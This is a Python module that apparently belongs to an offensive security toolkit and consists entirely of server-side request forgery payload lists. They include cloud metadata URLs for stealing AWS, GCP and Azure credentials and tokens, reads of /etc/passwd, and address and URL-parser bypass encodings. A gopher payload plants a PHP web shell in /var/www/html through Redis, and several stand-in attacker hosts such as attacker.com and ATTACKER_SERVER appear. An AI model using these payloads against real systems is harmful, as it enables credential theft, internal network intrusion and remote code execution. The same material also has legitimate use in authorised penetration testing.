"""
Server-Side Request Forgery (SSRF) Payloads
Includes cloud metadata, internal services, and bypass techniques
"""

SSRF_PAYLOADS = {
    "detection": [
        # Basic detection
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:22",
        "http://127.0.0.1:8080",
        "http://[::1]",
        "http://0.0.0.0",
        "http://0",
        "http://ATTACKER_SERVER/ssrf-test",
    ],

    "localhost_variations": [
        # Various localhost representations
        "http://127.0.0.1",
        "http://127.0.1",
        "http://127.1",
        "http://0.0.0.0",
        "http://0",
        "http://localhost",
        "http://[::1]",
        "http://[::ffff:127.0.0.1]",
        "http://[0:0:0:0:0:ffff:127.0.0.1]",
        "http://2130706433",  # Decimal IP
        "http://0x7f000001",  # Hex IP
        "http://0177.0.0.1",  # Octal IP
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.xip.io",
        "http://localtest.me",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
    ],

    "cloud_metadata": {
        "aws": [
            # AWS EC2 Instance Metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/ami-id",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/public-ipv4",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",

            # AWS ECS Task Metadata
            "http://169.254.170.2/v2/metadata",
            "http://169.254.170.2/v2/credentials",

            # IMDSv2 (token required)
            # First: PUT http://169.254.169.254/latest/api/token with X-aws-ec2-metadata-token-ttl-seconds header
            # Then use token in X-aws-ec2-metadata-token header
        ],

        "gcp": [
            # Google Cloud metadata
            "http://169.254.169.254/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/project/",
            "http://169.254.169.254/computeMetadata/v1/project/project-id",
            "http://169.254.169.254/computeMetadata/v1/instance/",
            "http://169.254.169.254/computeMetadata/v1/instance/hostname",
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            # Requires header: Metadata-Flavor: Google
        ],

        "azure": [
            # Azure Instance Metadata
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
            # Requires header: Metadata: true
        ],

        "digitalocean": [
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/id",
            "http://169.254.169.254/metadata/v1/hostname",
            "http://169.254.169.254/metadata/v1/region",
        ],

        "oracle": [
            "http://169.254.169.254/opc/v1/instance/",
            "http://169.254.169.254/opc/v2/instance/",
        ],

        "alibaba": [
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/instance-id",
        ],

        "kubernetes": [
            "https://kubernetes.default.svc/",
            "https://kubernetes.default.svc/api/v1/namespaces",
            "https://kubernetes.default.svc/api/v1/pods",
            "https://kubernetes.default.svc/api/v1/secrets",
            # Service account token: /var/run/secrets/kubernetes.io/serviceaccount/token
        ],

        "docker": [
            "http://127.0.0.1:2375/version",
            "http://127.0.0.1:2375/containers/json",
            "http://127.0.0.1:2375/images/json",
            "http://127.0.0.1:2376/version",
        ],
    },

    "internal_services": [
        # Common internal ports
        "http://127.0.0.1:21",    # FTP
        "http://127.0.0.1:22",    # SSH
        "http://127.0.0.1:23",    # Telnet
        "http://127.0.0.1:25",    # SMTP
        "http://127.0.0.1:80",    # HTTP
        "http://127.0.0.1:110",   # POP3
        "http://127.0.0.1:443",   # HTTPS
        "http://127.0.0.1:445",   # SMB
        "http://127.0.0.1:3306",  # MySQL
        "http://127.0.0.1:5432",  # PostgreSQL
        "http://127.0.0.1:6379",  # Redis
        "http://127.0.0.1:8080",  # HTTP alt
        "http://127.0.0.1:8443",  # HTTPS alt
        "http://127.0.0.1:9200",  # Elasticsearch
        "http://127.0.0.1:11211", # Memcached
        "http://127.0.0.1:27017", # MongoDB

        # Internal network ranges
        "http://10.0.0.1",
        "http://172.16.0.1",
        "http://192.168.0.1",
        "http://192.168.1.1",
    ],

    "protocols": [
        # Different protocols
        "file:///etc/passwd",
        "file://localhost/etc/passwd",
        "dict://127.0.0.1:11211/info",
        "gopher://127.0.0.1:25/_HELO%20localhost",
        "gopher://127.0.0.1:6379/_INFO",
        "ldap://127.0.0.1:389",
        "tftp://127.0.0.1/test",
        "sftp://127.0.0.1/",
        "jar:http://attacker.com/evil.jar!/",
        "netdoc:///etc/passwd",
    ],

    "gopher": {
        # Gopher protocol for internal service exploitation
        "redis_rce": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<?php%20system($_GET['c']);?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a",
        "mysql": "gopher://127.0.0.1:3306/_",
        "smtp": "gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0ARCPT%20TO%3A%3Cvictim%40target.com%3E%0ADATA%0ASubject%3A%20test%0A%0Atest%0A.%0AQUIT",
        "memcached": "gopher://127.0.0.1:11211/_stats",
    },
}

# SSRF bypass techniques
SSRF_BYPASS = {
    "ip_encoding": [
        # Decimal IP
        "http://2130706433",  # 127.0.0.1
        "http://3232235521",  # 192.168.0.1
        "http://2852039166",  # 169.254.169.254

        # Hex IP
        "http://0x7f000001",  # 127.0.0.1
        "http://0xc0a80001",  # 192.168.0.1
        "http://0xa9fea9fe",  # 169.254.169.254

        # Octal IP
        "http://0177.0.0.1",  # 127.0.0.1
        "http://0177.0.0.01",
        "http://0177.00.00.01",
        "http://0300.0250.0.1",  # 192.168.0.1

        # Mixed encoding
        "http://127.0.0x1",
        "http://127.0x0.1",
        "http://0x7f.0.0.1",
        "http://0177.0.0.0x1",
    ],

    "ipv6": [
        "http://[::1]",
        "http://[::ffff:127.0.0.1]",
        "http://[0:0:0:0:0:ffff:127.0.0.1]",
        "http://[::]",
        "http://[0000::1]",
        "http://[::1]:80",
        "http://[::ffff:169.254.169.254]",
    ],

    "dns_rebinding": [
        # Use a DNS rebinding service
        "http://make-127-0-0-1-rr.1u.ms",
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.sslip.io",
        "http://www.127.0.0.1.xip.io",
        "http://localhost.localtest.me",
        "http://127.0.0.1.vcap.me",
    ],

    "url_parsing": [
        # URL parser confusion
        "http://attacker.com@127.0.0.1",
        "http://127.0.0.1#@attacker.com",
        "http://127.0.0.1:80@attacker.com",
        "http://attacker.com#@127.0.0.1",
        "http://127.0.0.1\\@attacker.com",
        "http://127.0.0.1:80\\@attacker.com",
        "http://127.0.0.1%23@attacker.com",
        "http://127。0。0。1",  # Fullwidth dots
        "http://127%E3%80%820%E3%80%820%E3%80%821",
        "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",  # Enclosed characters
    ],

    "redirect": [
        # Use open redirect
        "http://attacker.com/redirect?url=http://127.0.0.1",
        "http://attacker.com/?url=http://169.254.169.254/",
    ],

    "encoding": [
        # URL encoding
        "http://%31%32%37%2e%30%2e%30%2e%31",
        "http://%6c%6f%63%61%6c%68%6f%73%74",

        # Double URL encoding
        "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531",

        # Unicode encoding
        "http://127.0.0.1%00",
        "http://127.0.0.1%0d%0a",
    ],

    "protocol_smuggling": [
        # Protocol confusion
        "http://127.0.0.1:22/",  # SSH on HTTP
        "http://127.0.0.1:25/",  # SMTP on HTTP
        "https://127.0.0.1:80/",  # HTTP on HTTPS
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
    ],

    "special": [
        # Special cases
        "http://0/",
        "http://0.0.0.0/",
        "http://127.1/",
        "http://127.0.1/",
        "http://127.0.0.1./",
        "http://[::]:80/",
        "http://spoofed.burpcollaborator.net",
    ],
}

# Port scanning via SSRF
SSRF_PORT_SCAN = {
    "common_ports": [21, 22, 23, 25, 80, 110, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 11211, 27017],
    "web_ports": [80, 443, 8000, 8080, 8443, 8888, 9000, 9090],
    "db_ports": [1433, 1521, 3306, 5432, 6379, 27017, 11211, 9200],
}
